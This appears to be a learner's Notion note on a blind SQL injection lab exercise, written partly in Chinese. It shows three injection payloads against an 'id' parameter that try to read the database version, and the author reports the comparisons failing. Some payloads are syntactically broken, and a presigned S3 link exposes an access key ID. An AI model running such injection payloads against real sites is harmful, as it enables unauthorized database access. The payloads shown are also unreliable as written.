# SQL Injection (Blind)


> Objective:
Find the version of the SQL database software through a blind SQL attack.
>

### 卡關 QQ

但如果再增加下去 10.x.x 的判斷會無效，崩潰

換個環境再測 db 是 `5.7.34` ，也是第二個小數點之後無法正常判斷，頂多只能判斷到 5.7

```sql
id=1 AND (SELECT SUBSTRING((SELECT @@version),1,5)) = 10.10&Submit=Submit
```

```sql
id=1 AND (SELECT @@version) like 10.1.26-MariaDB-0+de&Submit=Submit
```

```sql
id=1 AND SELECT (SELECT @@version)) = 5.7.34&Submit=Submit
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/ffffd1c6-c73a-4723-9dba-eda574016665/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220216%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220216T162046Z&X-Amz-Expires=86400&X-Amz-Signature=996d44a6b6eb9f6ff039d065ca28e6c15f2dae3bc3edbef07c9a1fb524da51da&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)